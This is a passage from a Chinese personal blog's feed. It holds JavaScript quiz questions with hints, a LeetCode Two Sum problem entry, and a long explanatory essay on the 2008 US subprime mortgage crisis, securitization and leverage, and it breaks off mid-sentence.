class="keyword">min</span>(), <span class="keyword">max</span> = Math.<span class="keyword">max</span>()</div><div class="line"><span class="keyword">min</span> &lt; <span class="keyword">max</span></div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>Math.min</code> 不传参数返回 正<code>Infinity</code>；<br>2、 <code>Math.max</code> 不传参数返回 负<code>Infinity</code>；<br>答案: <code>false</code></p><h2 id="四十一"><a href="#四十一" class="headerlink" title="四十一"></a>四十一</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function captureOne(re, str) &#123;</div><div class="line">  var <span class="attr">match</span> = re.exec(str);</div><div class="line">  return match &amp;&amp; match[<span class="number">1</span>];</div><div class="line">&#125;</div><div class="line">var <span class="attr">numRe</span>  = /<span class="attr">num=(\d+)/ig,</span></div><div class="line">    <span class="attr">wordRe</span> = /<span class="attr">word=(\w+)/i,</span></div><div class="line">    <span class="attr">a1</span> = captureOne(numRe,  <span class="string">"num=1"</span>),</div><div class="line">    <span class="attr">a2</span> = captureOne(wordRe, <span class="string">"word=1"</span>),</div><div class="line">    <span class="attr">a3</span> = captureOne(numRe,  <span class="string">"NUM=2"</span>),</div><div class="line">    <span class="attr">a4</span> = captureOne(wordRe, <span class="string">"WORD=2"</span>);</div><div class="line">[<span class="attr">a1</span> === a2, <span class="attr">a3</span> === a4]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、/g有一个属性叫lastIndex，每次匹配如果没有匹配到，它将重置为0，如果匹配到了，他将记录匹配的位置<br>2、 因为第一个正则有一个 g 选项 它会‘记忆’他所匹配的内容, 等匹配后他会从上次匹配的索引继续, 而第二个正则不会<br>答案 <code>[true, false]</code></p><h2 id="四十二"><a href="#四十二" class="headerlink" title="四十二"></a>四十二</h2><figure class="highlight pony"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="function"><span class="keyword">new</span> <span class="title">Date</span>("<span class="number">2018</span><span class="number">-07</span><span class="number">-19</span>"),</span></div><div class="line"><span class="title">b</span> = <span class="title">new</span> <span class="title">Date</span>(<span class="number">2018</span>, <span class="number">07</span>, <span class="number">19</span>);</div><div class="line">[<span class="title">a</span>.<span class="title">getDay</span>() === <span class="title">b</span>.<span class="title">getDay</span>(), <span class="title">a</span>.<span class="title">getMonth</span>() === <span class="title">b</span>.<span class="title">getMonth</span>()]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>getDay()</code>是获取星期几；<code>getMonth()</code>是获取月份所以都不同<br>2、 <code>[a.getDate() === b.getDate()]</code> //true<br>3、 <code>var a = new Date(&quot;2018-07-19&quot;)</code>  //能够识别这样的字符串，返回想要的日期<br>4、 <code>b = new Date(2018, 07, 19);</code>  //参数要按照索引来<br>5、 <code>a.getMonth()</code> // 6   月份是从 0 开始索引的<br>答案：<code>[false, false]</code></p><h2 id="四十三"><a href="#四十三" class="headerlink" title="四十三"></a>四十三</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="string">'http://giftwrapped.com/picture.jpg'</span>.match(<span class="string">'.gif'</span>)) &#123;</div><div class="line">   <span class="string">'a gif file'</span></div><div class="line"> &#125; <span class="keyword">else</span> &#123;</div><div class="line">   <span class="string">'not a gif file'</span></div><div class="line"> &#125;</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 <code>String.prototype.match</code> 接受一个正则, 如果不是, 按照<code>new RegExp(obj)</code> 转化. 所以 <code>.</code> 并不会转义 <code>。</code> 那么 <code>/gif</code> 就匹配了 <code>/.gif/</code><br>答案: <code>&#39;a gif file&#39;</code></p><h2 id="四十四"><a href="#四十四" class="headerlink" title="四十四"></a>四十四</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> a;</div><div class="line">  <span class="keyword">return</span> a;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">a</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="string">'bye'</span>;</div><div class="line">    <span class="keyword">return</span> a;</div><div class="line">&#125;</div><div class="line">[foo(<span class="string">'hello'</span>), bar(<span class="string">'hello'</span>)]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、答案：<code>[&quot;hello&quot;, &quot;bye&quot;]</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一&quot;&gt;&lt;/a&gt;一&lt;/h2&gt;&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;2&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;3&quot;&lt;/span&gt;].&lt;span class=&quot;built_in&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;parseInt&lt;/span&gt;)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;Hint: &lt;/strong&gt;&lt;br&gt;1、这里的 &lt;code&gt;map&lt;/code&gt; 不是“地图”的意思，而是指“映射”，&lt;code&gt;[].map()&lt;/code&gt;返回一个新的数组；&lt;code&gt;map()&lt;/code&gt;有三个参数。&lt;br&gt;2、&lt;code&gt;parseInt()&lt;/code&gt; 解析一个字符串，并返回一个整数； &lt;code&gt;parseInt()&lt;/code&gt; 有两个参数。&lt;br&gt;  &lt;code&gt;parseInt(&amp;quot;11&amp;quot;,2);        //返回 3 (2+1)&lt;/code&gt;&lt;br&gt;答案：&lt;code&gt;[1, NaN, NaN]&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JavaScript for LeetCode/Easy篇</title>
    <link href="wangsiyuan233.github.io/2018/06/19/54LeetCode-Easy/"/>
    <id>wangsiyuan233.github.io/2018/06/19/54LeetCode-Easy/</id>
    <published>2018-06-19T07:19:16.000Z</published>
    <updated>2018-06-20T03:38:05.646Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Two Sum  </p></blockquote><p>【Easy 01】【total 01】【<a href="https://leetcode.com/problems/two-sum/description/" target="_blank" rel="external">题目链接</a>】【github链接】</p><ul><li><strong>题目：</strong><br>Given an array of integers, return indices of the two numbers such that they add up to a specific target.</li></ul><p>You may assume that each input would have exactly one solution, and you may not use the same element twice.<br><a id="more"></a></p><ul><li><strong>Example:</strong><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Given nums = [<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>], target = <span class="number">9</span>,</div><div class="line"></div><div class="line">Because nums[<span class="number">0</span>] + nums[<span class="number">1</span>] = <span class="number">2</span> + <span class="number">7</span> = <span class="number">9</span>,</div><div class="line">return [<span class="number">0</span>, <span class="number">1</span>].</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Two Sum  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;【Easy 01】【total 01】【&lt;a href=&quot;https://leetcode.com/problems/two-sum/description/&quot;&gt;题目链接&lt;/a&gt;】【github链接】&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;题目：&lt;/strong&gt;&lt;br&gt;Given an array of integers, return indices of the two numbers such that they add up to a specific target.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You may assume that each input would have exactly one solution, and you may not use the same element twice.&lt;br&gt;
    
    </summary>
    
    
      <category term="LeetCode-Easy" scheme="wangsiyuan233.github.io/tags/LeetCode-Easy/"/>
    
  </entry>
  
  <entry>
    <title>美国次贷危机</title>
    <link href="wangsiyuan233.github.io/2018/06/17/53%E7%BE%8E%E5%9B%BD%E6%AC%A1%E8%B4%B7%E5%8D%B1%E6%9C%BA/"/>
    <id>wangsiyuan233.github.io/2018/06/17/53美国次贷危机/</id>
    <published>2018-06-18T02:32:24.000Z</published>
    <updated>2018-06-18T19:39:45.948Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、金融业真的是多余的吗？</p></blockquote><p>很多电影都在暗示金融业是一个不创造任何财富的行业，好像是整个社会的寄生虫一般，这是错的非常离谱的。</p><p>其实正是因为有了金融的运作 —— 股市的存在，西方国家才得以从19世纪马克思笔下的那种原汁原味的资本主义制度转型成了今天这种半资本主义半社会主义的制度。我们不妨再拿乔布斯举个例子。如果美国现在的经济制度还是延续着19世纪的传统的话，那么乔布斯很可能就是这个星球上有史以来最富有的人。原因很简单，苹果公司已经连续很多年荣膺全球最赚钱公司了，巅峰时期曾达到过一年赚500亿美元的纯利润，去年虽然下降了不少但依然有390亿美元。然而我们发现乔布斯在去世时只留下了86亿美元的财富。为什么会这样？</p><p>因为乔布斯根本就不是一个资本家，苹果公司不属于他，而是属于全体股东 —— 最普通的美国老百姓的。</p><p>这里就出了一个问题，既然这样，那乔布斯创立苹果之后，为什么要让它上市呢？为什么不像当年的约翰·洛克菲勒那样把它据为己有，然后取洛克菲勒而代之成为人类历史上最有钱的人呢？</p><p><img src="https://i.imgur.com/xdNGEkN.jpg" alt=""></p><p>原因在于他做不到。如果他不这样做（上市），那么这样做了的人的公司就会得到迅速的发展，从而远远的将他和苹果公司甩在后面。这些人中的佼佼者，无疑就是比尔·盖茨先生。<br><a id="more"></a></p><p>1983年，一位非常聪明的年轻人发明了一个可以改变人类生活方式的产品，他便是年仅28岁的比尔·盖茨和其刚刚设计完成的 Windows 操作系统。</p><p>如果没有金融业的话，那么盖茨先生只会有能力将它卖给很小范围内的一部分客户（没有足够的营销团队和财力做广告），然后一点一点的扩大业务，仅仅凭借赚到的现金来招收更多的员工。</p><p>然而1986年微软公司在 NASDAQ 股票市场完成了上市，并一下子筹集到了一大笔钱，这笔钱帮助微软从一家地区性的小公司迅速的成长为跨国公司。这样，在短短几年之内，全世界的用户都用上了 Windows 这款绝好的操作系统。结果是显而易见的 —— 人民生活水平提高了，盖茨先生也得到了应得的财富。</p><p>如果没有金融的运作参与其中，这一过程可能要推后10年，甚至20年。</p><p>对于当年那些购买了微软股票的人来说，他们是在“把现在的收入变成未来的收入，但是未来的收入更多了。”微软的股价从上市至今已经上涨了超过一千倍，当初购买了股票的人现在多数都已是百万富翁。</p><p><img src="https://i.imgur.com/cBYM1eE.jpg" alt=""></p><p>而对于盖茨先生和微软来说，则是“把未来的收入变成了现在的收入，从而改变了未来！”由于有了更多的资金投入研发，微软的产品就可以迅速的更新换代。这个过程甚至改变了大部分人类的生活方式。</p><p>当然，金融业的贡献远远不止于此。它还有另一项绝顶重要的功能—— 资产管理，这就涉及到了股市之外的另一个金融领域 —— 保险业。西方的全民医疗大家认为什么怎么实现的？难道是直接由政府用现金去为每个公民的医疗费用买单吗？当然不是。事实是由政府为每个公民购买医疗保险，而如何用政府付的钱去为公民的医疗费用买单是保险公司的事。保险公司通过金融的运作，最终可以以很低的成本（保费）解决很大的问题（全民医疗）。养老金呢？也一样。美国的养老金余额占全世界的65%，超过18万亿美元！而中国的养老金余额仅为3万亿元人民币 …… 我在《激辩余额宝》那篇文中写到过美国人不存钱的原因（储蓄率曾一度在2005年低至 - 1%），因为他们只需将平均每个月20%的收入用来购买保险就足够了，还存钱干什么呢？因此，陈志武先生在其著作《金融的逻辑》中写到：中国人勤劳而不富有的原因就在于金融业太落后了。我相信他的意思应该是我们即没有一个高效的股市可以将资本家的财富合法合理的分配给普通老百姓；也没有一套可靠的保险体系来让老百姓可以在生活的过程中无后顾之忧。</p><p><img src="https://i.imgur.com/T8rpIN7.jpg" alt=""></p><blockquote><p>二、次贷危机</p></blockquote><p>假设现在是2001年，你想在美国买一套价值100万美元的房子，没有多少人有能力用现金买房子，所以你决定用贷款的方式。美国的银行或类似的信贷机构会贷给你多少钱呢？—— 100万，甚至105万，连买保险的钱也贷款给你了。</p><p>（一分钱首付都不要的原因并非很多人所想象的美国金融业不负责任，而是因为美国就是一个信用社会。在美国消费基本上都是先拿走东西后付款。美国人虽然没有户口本儿，却人人都有一个名为“信用积分 credit score”的东西，因此不管是银行也好还是商家也好，都不会怕你借了钱不还或拿了东西后赖账。因为信用积分高的话，你会发现买什么东西都会便宜很多（会比别人便宜 5% ~ 20% 左右），而信用积分低的话，不仅买东西要更贵，而且以后你在任何地方都别想借钱了）。</p><p>这些银行或信贷公司借给你的钱就被称为住房抵押贷款（Housing Mortgage）。如果是在中国的话，那么这件事就到此为止了。但是美国的银行很聪明，他们不想等上20年才收回这些资金，于是它们把这些贷款又以 MBS（Mortgage Backed Security）住房抵押贷款证券的形式，卖给了其它金融机构。</p><p>什么意思呢？举个例子，假设我是银行A，我贷款了1000万美元给一些顾客买房，于是我现在有了比方说1500万美元（连本带利）的抵押贷款资产，但是这些资产我要分20年才能全部收回来，我不想等那么久，于是我把它以住房抵押贷款证券MBS的形式卖给你，另一家金融机构B，可能以1100万美元的价格（价格由当时的市场利率决定）。对于你来说，你用今天的1100万美元换了20年1500万美金的现金流，因此你是满意的！对于我来说，我一转手就净赚了100万美元，当然也是满意的。</p><p>当我，银行A，把MBS卖给你之后，你就拥有了这些MBS背后现金流（每个月贷款人所还本息）的所有权，但我还是会帮你去贷款买房子的人那里收钱，然后再将收到的钱转账给你。在这个过程中，我是 Servicer 服务者，你是 Owner 所有者。</p><p>这个神奇的过程就叫做<strong>证劵化</strong>！</p><p><img src="https://i.imgur.com/pxqzP3J.jpg" alt=""></p><p>这样一个过程和中国的那种传统模式有一个本质的不同，便是贷款人违约的风险被转移了。</p><p>在传统模式下，如果贷款买房的人违约了，那么银行要遭受很大的损失。而在这种证劵化的模式下，如果前者违约了，遭受损失的人将不再是银行A，因为它已经把这些贷款的所有权（以MBS的形式）卖给了另一家金融机构B，因此遭受损失的人就变成了购买了这些MBS的B。</p><p>那么这个所谓的另一家金融机构B，又是谁呢？</p><p>在房地产抵押贷款证券市场上，有接近一半的MBS 都卖给了著名的房利美和房地美 —— Fannie Mae &amp; Freddie Mac。在2007年次贷危机爆发前夕，它们所发行的MBS总金额高达4.4万亿美元。</p><p>不过它们也仅仅是中介而已，房地美和房利美买到这些MBS之后，也根本没打算持有它们到期（20年后），而是会将它们转手卖向全世界 —— 政府（主权财富基金）、银行、对冲基金、保险公司、养老金、个人投资者等等。</p><p>在这种情况下，就形成了一个完整的资金流转的链条 —— 从贷款买房的房主直达全世界的投资者。</p><p>这相当于全世界的投资者在“资助”美国人民买房，所以美国的房价从2001年开始，以历史上从未有过的速度上涨，泡沫就这样诞生了。</p><p>由于房地美和房利美是一种半国有化的企业，因此它们受到了严格的监管。它们从银行手中购买的MBS中的大部分（约为80%）都是最优质的，或者说，违约率最低的房地产抵押贷款证券MBS。</p><p>那么它们又如何分辨哪些MBS是优质的，哪些是劣质的呢？</p><p>这就要说到全球金融业中可以说是权力最大的三家公司 —— 三大评级公司的作用了。</p><p><img src="https://i.imgur.com/FmaPRt9.jpg" alt=""></p><p>评级公司负责为大多数在市场上交易的证券（包括MBS）进行评级。评级的基础是这些MBS背后那些借款人的原始资料。举个例子，我，银行A，想要发行为期20年，价值为1000万美元的MBS，那么我该如何为它定价？800万，还是900万？这时我就必须去找到评级公司。它们会根据我提供的借款人的资料，例如这些人的信用积分（前文中提到过的这个在美国生活最重要的东西之一，还记得吧？）；个人/家庭资产与负债的比例；以及每年需要偿还贷款的金额与年收入之比（最优级的话一般不能超过40%）。</p><p>根据这些信息，评级公司就会给这个MBS评一个级，例如AAA级，意味着评级公司认为这种证券的违约率非常非常低，投资这种债券的风险是很低的。或者C级，也叫“垃圾级”，例如现在希腊的国债，投资这种债券被违约的风险是很高的。购买1000万美元AAA级的MBS可能需要900万，而购买同样金额C级的MBS可能只需要600万。当然是评级越高，卖的越贵了。</p><p>当然，市场中作为MBS分销商的不仅有房地美和房利美，还有大名鼎鼎的各大华尔街投资投行们。</p><p><img src="https://i.imgur.com/385YFUg.jpg" alt=""></p><p>投资银行们（花旗、美林、高盛、雷曼兄弟、贝尔斯登、摩根斯坦利、摩根大通等等 ……）发现，从2001年开始，美国的房价就一直处于稳定的上升期。于是他们推测，即便找一些信用不好的人来放贷，也不会有很大的风险，因为即便是遭遇了违约，只要把房子收回来再卖掉就可以了嘛（抵押贷款证券MBS，顾名思义是以房子为抵押的）。</p><p>于是它们开始联合银行和信贷机构去发放更多的“次级债”，也就是开始为信用不好的人提供贷款。</p><p>对于发放贷款的银行和信贷机构来说呢？前面已经解释过，由于证劵化的过程，它们可以将这些MBS违约的风险转移给购买了这些MBS的投资银行们，因此它们又何乐而不为呢？越多越好！</p><p>因此，“次贷”危机中的次级抵押贷款（Sub-prime loan）或次级MBS，就这么诞生了。</p><p><img src="https://i.imgur.com/tTlSITN.jpg" alt=""></p><p>在这整个的证券化链条中，哪个环节是最关键的？毫无疑问，是贷款买房的人的信誉，最关键的地方在于他们能否将房贷如期如数的还给银行，再由银行传递给全世界的投资者们。</p><p>而当我们了解了整个证券化的过程之后，我们会想，不管是银行也好，还是信贷公司也好，都有动力去为信用级别很差的人放贷，而最终这些信用级别很差的人是很有可能违约的。如果事实果真如我们所想的话，那么未来整个证券化链条的崩塌也便不是不可能的事了。</p><p>影片重点描绘了贝尔和 Mark 是如何去调查的。</p><p>贝尔是在电脑前，去阅读那些MBS背后借款人的原始资料。因为他是对冲基金经理，他是买方，所以有权要求卖方（投资银行）提供这些资料。可想而知阅读这些资料是非常乏味的，贝尔仔细阅读了几十份这样的资料，粗略浏览了几百份（每一份都有几百甚至上千人的信息）。在书中，迈克尔·刘易斯这样写到：Dr. Burry 认为自己是这个地球上除了起草这些文件的律师之外，唯一一个阅读它们的人。</p><p>（这就解释了一位朋友在评论中所问的一个问题：难道这些金融机构或投资人不会去看看借款人的原始资料吗？很明显，资料就在那里，不过并没有什么人想要花时间看它们，因为有评级机构 …… 后面会讲到评级机构的作用）</p><p>在阅读这些资料的过程中贝尔惊奇的发现，在他所阅读过的大部分料中，其中 50%的借款人是没有任何资料的！也就是说只有不到 50%的人提供了收入证明、财产证明、信用积分等资料，而剩下的超过 50%的人是完全没有任何资料的！这意味着什么？意味着不是这些人完全不符合贷款的资格，就意味着银行在放贷时根本就没有要求他们提供任何资料！</p><p>那么 Mark 是如何去调查的呢？Mark 的做法是直接走访第一线，去看看银行和信贷公司到底是如何发放贷款的。电影中演到了两个场景：第一，当 Mark 问一家房子的租户 XXX（房屋的主人）是否在家时，租户告诉他那是一条狗的名字，是房主的狗的名字！也就是说，银行贷款给了一条狗！我不知道这是否是真实存在过的事 …… 但2007年4月当新世纪贷款公司破产，次贷危机的第一块骨牌倒下的时候，人们对新世纪贷款公司的形容确实是“它甚至会放贷给一条狗。”不知导演是否从这里得到了灵感。第二个场景便是当 Mark 询问负责给借款人放贷的银行的 Agent “是否曾拒绝过任何人贷款买房的请求”时，得到的答案是：“NO” ~</p><p>(再多说两句，真正厉害的投资人都是干这种事的，都是去第一线找第一手资料的。如果只是每天看着所有人都会看的财务报表；听着每天所有人都听的新闻，又如何能比市场的反应更快呢？要知道巴菲特在买了万事达的股票之后是去超市柜台前数有多少人用万事达信用卡的，一站就是一天；买了石油公司的股票之后是去火车站数油罐车的。)</p><p>还记得之前讲到虽然借款人的原始资料就在那里，但投资人也不会去看的吗？原因在哪里？因为评级公司会看，评级公司看完之后会给这些MBS评一个级，投资人只需根据评级来判断这些证券的风险就好了嘛。自从1902年 John Moody 创立了 Moody 评级公司之后，这种模式在过去将近一个世纪都运转良好，谁会想到这一次会出问题呢？（Moody 的大股东之一就是沃伦·巴菲特同学，Moody 的商业模式被巴菲特誉为是史上最成功的）</p><p>那么一向可靠的评级公司又出了什么问题呢？</p><p>电影里给出的答案是这样的：当 Mark 一行人拿着他们所搜集的，包含了很多没有借款人任何信息的MBS的资料去质问标准普尔（三大评级公司之一），为什么会给这些MBS评级AAA（最高级别）的时候，标准普尔是这么说的：如果我们不给这些MBS评级为AAA，这些公司就会去找 Moody（标准普尔的竞争对手）了。</p><p>这恐怕只能算作电影艺术的一种夸张手法了 …… 且不说标准普尔的人凭什么把“真”话说出来 …… 如果这就是真相的话，那岂不世界上所有的债券都要被评级为AAA了？</p><p>那么事实可能是怎样的呢？迈克尔·刘易斯在《大空头》这本书中给出一些解释：</p><p>一方面，华尔街投资银行的债券交易员们都是一些年收入7位数的人，他们哄骗那些年收入5位数的家伙（评级公司的员工）绰绰有余。事实上，评级公司那些最优秀的员工都纷纷跳槽到了投资银行，帮助自己的新东家去对付自己的老东家。</p><p><img src="https://i.imgur.com/kJy91t4.jpg" alt=""></p><p>举个例子来说，FICO评分是用于测算个人借款的信用值，最高850分，最低300分，美国的中位数是723分。Moody 和标准普尔使用的方法是用一个MBS中所有借款人的平均FICO评分。例如AAA评级所要求的FICO的平均分在615分左右，投行们便寻找一半550分的借款人和一半680分的借款人，然后（有目的的）将他们放在一个MBS里，这样这个MBS就可以被评为AAA级了。而事实上一个评分为550分的借款人，断供的可能性是很大的。典型的上有政策下有对策 ……</p><p>另一方面，迈克尔·刘易斯在书中写到，当有基金经理去质问评级公司为什么会给明显不靠谱的MBS评AAA级时，得到的回答都是：“住房价格在全国范围内同时下跌是不可能的，过去60多年的数据表明，从未出现过美国全国范围内住房价格同时下跌的情况。”</p><p>也就是说，在评级公司看来，由于这些MBS都是抵押贷款证券，即便遭遇了违约，只要把房子收回来再卖掉就可以了嘛（前面分析过）。除非房价下跌了，投资人才会真正的受到损失。然而又由于每个MBS都是由分布在全国各地的房子为抵押的（很正常的一种分散风险的做法），因此除非全国各地的房价同时开始下跌，不然这样的MBS是不会有什么风险的。而自从大萧条之后，美国从未出现过全国范围内房价同时下跌的情况。</p><p>这个理由就靠谱多了。</p><p>可是评级公司没有想到的是，美国的房地产市场在平稳的发展了80年之后，又经历了一次泡沫，而当泡沫破裂之时，正是全国房价同时下跌之日 ……</p><p>让我们再次回到2001年。</p><p> 2001年美国经历了两件大事。第一，从2010年3月开始破灭的互联网泡沫到了2001年开始全面崩溃。第二，美国遭遇了9-11恐怖袭击。袭击之后，金融市场的流动性开始急剧紧缩，一场衰退马上就要到来。</p><p>为了应对危机，时任美联储主席的艾伦·格林斯潘开始下调利率，如图，从2001年的6.5%一路下调至2003年的1%。</p><p>1%的利率对炒房者来说，炒房的代价降低了；但对于企业来说，投资研发新产品的代价也降低了呀。一个社会中不管是钱多了还是钱少了，都有一个资金的流向问题，因为资金不可能平均的覆盖每一个行业。</p><blockquote><p>三、投机和泡沫</p></blockquote><p>我们知道，泡沫往往来源于流动性过剩 —— 低利率政策（虽然两者之间没有必然的因果关系，但后者确实是前者的必要条件）。而泡沫的崩溃，则往往来源于流动性的收紧 —— <strong>高利率政策</strong>。</p><p>我们知道，正是美联储从1999年5月到2000年5月数次提高利率 —— 从4%提高到6.5%，直接导致了互联网泡沫在2000年的崩溃。再往前说，1990年，日本央行为了控制通货膨胀率，将利率从1%提高到3%，直接导致了“平成泡沫”的崩盘以及其一个又一个“失去的十年”。又例如2007年上半年，我国央行连续12次加息以应对通货膨胀，股市和楼市都在2007年下半年崩溃。次贷危机的导火索也不例外，2004年年中，时任美联储主席的格林斯潘开始加息以应对通胀，如图，从1%一路上调至5%。美国的房地产价格也开始在2006年回落。正是房地产价格的回落引爆了次贷危机。</p><p>当货币供应量增长的速度追不上泡沫增长的速度时，泡沫就会破裂。</p><p>在美国的购房政策中，有一条被称为<strong>“Foreclosure（止赎权）”</strong>。也就是说，利用贷款购买了房子的房主，可以在任何时候放弃房子的所有权，将房子退还给银行，同时停止偿付贷款（当然之前已经还的金额也是要不回来的）。</p><p><img src="https://i.imgur.com/KQ9ugdw.jpg" alt=""></p><p>在以前，我误认为在房价下跌的时候，会有很多人主动执行止赎权把房子退还给银行，因为当他们发现房子的市场价值已经低于自己要偿还的贷款金额时，干嘛不行使止赎权然后重新以更低的价格去买一套呢？于是我认为这是美国房地产崩溃的主要原因。</p><p>然而事实并非如此。来到美国之后，我才发现信用积分这个东西对美国人来说有多重要 …… 也就是说，你当然可以行使止赎权把房子退掉，但这种被称为“战略性违约”的行为会让你的信用积分大幅下降，用我美国投行朋友的话说，Foreclosure equals death，<strong>“行使止赎权等于死亡”</strong>。</p><p>如果不是房价下跌导致了借款人违约率的上升，那又是什么呢？</p><p>《大空头》再次给我们提供了答案：1996年时，有65%的贷款是固定利率的，而到2005年时，75%的贷款变成了浮动利率。</p><p>举个例子哈哈</p><p><img src="https://i.imgur.com/39izKkl.jpg" alt=""></p><p>我贷款100万美元买了一套房，利率是1%，为期20年的话我一共要还110万，每个月还4600美元。如果是固定利率贷款的话，那么我只用每个月还4600美元，还20年就行了。</p><p>然而对于银行来说，银行知道利率不可能长期在 1%这么低的位置停留，未来利率一定会升高，因此如果我20年内都只让你付 1%的利息的话，那银行不就亏死了。因此银行在贷款的时候不会和你签固定利率贷款合同，而会跟你签浮动利率贷款合同。这个利率可能是美联储的联邦基金利率 + 1%。假设现在的联邦基金利率是 0%，那么针对你这笔贷款的利率就是 1%，你依然每个月还 4600 美元。然而当美联储开始在2004年加息！联邦基金利率变成了 1%，那么针对你这笔贷款的利率就会变成 2%！此时你就不是每个月还 4600 了，而是变成还 5058 美元。更不用说格林斯潘一路把利率从 1%提高到 5%了！在 6%的利率水平下你将每月还 7176 美元。大家可以想象一下如果你的房租在两年之内从每月 4600 元上涨到每月 7176，你还租的起现在的房子吗？于是有大量的人在2006年开始被迫行使“止赎权”，将房子退还给银行。</p><p>当利率为 1%的时候，贷款100万买房，20年内只需要还110万；而当利率为 6%的时候，贷款100万买房，20年内要还172万。因此在一方面，这会直接导致买房者的数量大幅下降。另一方面，大量的人（尤其是像电影中那位脱衣舞女那样拥有五套房子的人）开始被迫将房子退还给银行。而银行拿到房子之后，则不得不将房子马上低价拍卖。</p><p>（在另一本描述金融危机的著作里，甚至提到了一对英国夫妇曾购买了99套房子。一旦利率开始上升，这样的人是100%要违约/断供的）</p><p>在以上两个因素的相互作用下，美国的房地产业迎来了大萧条之后的第一次全面下跌。</p><p>大量的MBS开始遭遇违约，全世界所有购买了这些MBS的投资者 —— 政府、银行、养老金、对冲基金等等进而都遭遇了严重的亏损。次贷危机就这样，由美国迅速波及了全世界。当全世界都陷入危机时，像中国这样虽然与MBS没有多少交集但严重依赖出口的国家当然也不能幸免。</p><p>这里还有一个问题。</p><p>在这个传导链条中，从表面上看，银行和信贷公司是没有风险的，因为它们将MBS都卖给了投资银行和房地美、房利美，对吧？即便借款人违约了，也是后者受损失。然而投资银行和房地美、房利美也是没有风险的，因为它们又都将MBS卖给了全球的投资者，即便借款人违约了，受损失的也应该是全球的投资者呀。</p><p>那为什么我们看到在次贷危机中，反而是银行、信贷机构、投资银行、房地美和房利美先面临破产呢？</p><p>原因就在于，这些MBS资产都有一个存货期。银行和信贷机构肯定是一边放贷，一边找买主，就像企业一边生产一边卖产品一样，在任何时间，它们手中肯定都会积攒很多贷款/MBS存货。投资银行也一样，它会一边购买MBS，一边打包分散风险（前文中讲过，将不同地区的或不同信用等级的MBS放在一起），一边找买主。同样，它们手中也积攒着很多MBS存货。</p><p>当市场开始转差，它们手中的这些MBS就会大幅跌价，甚至到根本卖不出去的地步，可是购买这些MBS的钱已经付了出去，如果卖不掉，就会给它们带来极大的损失。</p><p>可手中一点点存货的亏损，就能够让一家存在了150年的全球五大投行之一的雷曼兄弟破产吗？</p><p><img src="https://i.imgur.com/p2BylIL.jpg" alt=""></p><p>能的。</p><p>原因在于它的<strong>杠杆率</strong>实在是太高了。</p><p>什么是杠杆率呢？</p><p>杠杆率（Financial Leverage） = 总资产/核心资本</p><p>核心资本就是银行的自有资本，假设我有5元钱，然后借了95元钱去炒股，这时我的总资产就是100元钱，核心资本则是5元。杠杆率就是100/5 = 20倍。</p><p>此时，假设我炒股亏了6% —— 总资产损失了6%，我的总资产就剩下94元了，而我的核心/自有资本只有5元，我的负债却是95元，就会直接导致我的总资产已不足以还债了 —— 94 &lt; 